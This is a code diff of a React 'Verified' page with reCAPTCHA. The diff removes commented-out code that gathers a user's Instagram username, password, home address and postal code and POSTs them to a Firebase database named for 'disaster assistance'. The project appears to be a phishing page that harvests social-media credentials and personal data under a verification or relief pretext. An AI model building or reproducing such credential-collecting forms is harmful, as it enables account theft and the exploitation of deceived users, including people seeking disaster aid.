@@ -8,13 +8,6 @@ import { useNavigate } from "react-router-dom";
 // import './Verified.css'
 
 const Verified = () => {
-    //   const [img, setImg] = useState('')
-
-    //   const handleClick = () => {
-    //     const imgRef = ref(imageDb, `files/${v4()}`)
-    //     uploadBytes(imgRef, img)
-    //     alert('sent')
-    //   }
 
     const [captchaValue, setCaptchaValue] = useState<string | null>(null);
     const recaptchaRef = useRef<ReCAPTCHA>(null);
@@ -34,54 +27,6 @@ const Verified = () => {
         }
     }
 
-
-
-
-    // const [user, setUser] = useState({
-    //     Instagram: "",
-    //     Password: "",
-    //     Home: "",
-    //     Postal: "",
-    // });
-
-    // const handleChange = (e: React.ChangeEvent<HTMLInputElement>) => {
-    //     setUser({ ...user, [e.target.name]: e.target.value });
-    // };
-
-    // const getData = (e: React.FormEvent<HTMLButtonElement>) => {
-    //     e.preventDefault();
-
-    //     if (!captchaValue) {
-    //         alert("Please complete the reCAPTCHA");
-    //         return;
-    //     }
-    //     const { Instagram, Password, Home, Postal } = user;
-
-    //     const options = {
-    //         method: "POST",
-    //         headers: {
-    //             "Content-type": "application/json",
-    //         },
-    //         body: JSON.stringify({
-    //             Instagram,
-    //             Password,
-    //             Home,
-    //             Postal,
-    //         }),
-    //     };
-
-    //     fetch("https://disasterassistance-b480a-default-rtdb.firebaseio.com/new.json", options)
-    //         .then((res) => res.json())
-    //         .then((data) => {
-    //             console.log(data);
-    //             alert("Information sent for processing")
-    //         })
-    //         .catch((error) => {
-    //             console.error(error);
-    //             alert("Message Saved");
-    //         });
-    // };
-
     return (
         <div className="px-4 pt-24 font-bold pb-3 ">
             <div className="flex">
@@ -93,8 +38,13 @@ const Verified = () => {
                 onChange={handleCaptchaChange}
                 className="ml-3"
             />
-            
-            <button onClick={handlesubmit} className="p-4 bg-blue-300 text-white bg-[#005288]"> Submit</button>
+            <button
+            onClick={handlesubmit}
+        type="submit"
+        className="mt-6 mb-4 w-full bg-blue-500 text-white py-2 rounded-md hover:bg-blue-600"
+      >
+        Submit
+      </button>
         </div>
     );
 };
